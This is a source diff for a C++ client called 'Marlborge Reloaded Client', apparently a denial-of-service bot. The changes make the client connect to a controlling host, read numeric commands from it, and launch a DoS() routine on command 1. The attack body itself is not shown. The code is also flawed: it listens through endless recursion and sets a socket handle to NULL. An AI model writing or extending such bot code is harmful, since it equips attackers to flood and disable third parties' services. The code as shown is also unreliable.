@@ -21,8 +21,10 @@ char buffer[1024];
 
 void CloseSocket() {
 	closesocket(sock);
+	sock = NULL;
 	WSACleanup();
 	iResult = NULL;
+	return;
 }
 
 void DoS() {
@@ -71,18 +73,26 @@ void ConnectSocket() {
 
 void Listen() {
 	cout << "Listening to the host" << endl;
-	recv(sock, buffer, sizeof(&buffer), 0);
-	if (strstr(buffer, "http")) {
-		CloseSocket();
-		return;
+	recv(sock, buffer, sizeof(buffer), 0);
+	stringstream ss;
+	ss << buffer; int opt; ss >> opt;
+	cout << opt << endl;
+
+	switch (opt) {
+	case 1:
+		DoS();
+		break;
+	default:
+		cout << "Invalid option sent from host" << endl;
+		break;
 	}
-	cout << "Invalid URL Sent!";
+
 	Listen();
 	return;
 }
 
 int main() {
-	cout << "Marlborge Reloaded Client (v0.5)" << endl;
+	cout << "Marlborge Reloaded Client v0.5 (Chameleon)" << endl;
 	ConnectSocket();
 	Listen();
 	DoS();
